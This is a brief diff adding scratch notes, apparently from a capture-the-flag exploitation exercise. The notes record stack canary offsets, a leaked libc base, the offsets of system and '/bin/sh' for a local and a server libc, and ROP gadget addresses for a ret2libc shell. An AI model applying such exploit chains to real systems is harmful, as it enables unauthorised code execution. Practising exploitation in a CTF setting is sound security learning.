@@ -1,0 +1,18 @@
+libc - leak($esi+20) = 1933312 (libc) = 0x1d8000
+
+ebp - numbers = 124 (stack)
+ebp - canary = 28 (stack)
+ebp - $esi = 92 => canary - $esi = 64 ($esi = addr 0f name)
+
+my libc
+libc - leak($esi+20) = 1933312 (libc) = 0x1d8000
+0003d200 T __libc_system
+17e0cf /bin/sh
+
+server libc:
+libc - leak($esi+20) = 1933312 (libc) = 0x1b0000
+0x00023f97 : pop eax ; ret
+0x000f1b31 : pop edx ; pop ecx ; pop ebx ; ret
+0x00002c87
+0003a940 T __libc_system
+158e8b /bin/sh
